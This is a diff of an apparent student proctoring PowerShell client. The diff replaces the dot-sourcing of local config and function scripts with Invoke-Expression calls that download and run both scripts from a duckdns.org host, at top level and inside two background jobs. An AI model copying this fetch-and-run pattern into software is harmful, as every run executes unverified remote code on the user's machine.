@@ -1,16 +1,11 @@
 # Load Windows Forms
 Add-Type -AssemblyName System.Windows.Forms
 
+Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
+Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
+
 $scriptPath = $MyInvocation.MyCommand.Path
 $scriptDirectory = Split-Path -Parent $scriptPath
-
-# Now you can dynamically set paths relative to this script
-$configScriptPath = Join-Path -Path $scriptDirectory -ChildPath 'config.ps1'
-$functionsScriptPath = Join-Path -Path $scriptDirectory -ChildPath 'functions.ps1'
-
-# Import the scripts
-. $configScriptPath
-. $functionsScriptPath
 
 
 # Function to check if a student ID file exists on the server
@@ -88,11 +83,10 @@ if (-not $exists) {
 
 # Define proctoring functions into a variable to use it in background jobs
 $functions = {
-    param ($studentid, $scriptPath, $configPath)
+    param ($studentid)
 
-    # Dot-source the temporary file to import the functions
-    . $scriptPath
-    . $configPath
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
 
     # Retrieve public key from web server
     try {
@@ -126,7 +120,7 @@ $functions = {
 }
 
 # Start the certificate handling job
-$certJob = Start-Job -ScriptBlock $functions -ArgumentList $studentid, $functionsScriptPath, $configScriptPath
+$certJob = Start-Job -ScriptBlock $functions -ArgumentList $studentid
 
 # Wait for the job to complete and output the results
 Wait-Job $certJob
@@ -134,11 +128,10 @@ Receive-Job $certJob
 
 # Update Token Job
 $jobScriptBlock = {
-    param ($studentid, $scriptPath, $configPath)
+    param ($studentid)
 
-    # Dot-source the temporary file to import the functions
-    . $scriptPath
-    . $configPath
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
+    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
 
     while ($true) {
         # Step 1: Check for existing certificate
@@ -172,7 +165,7 @@ $jobScriptBlock = {
 # Update Token Job
 $jobParams = @{
     ScriptBlock = $jobScriptBlock
-    ArgumentList = @($studentid, $functionsScriptPath, $configScriptPath)
+    ArgumentList = @($studentid)
 }
 
 $RefreshToken = Start-Job @jobParams
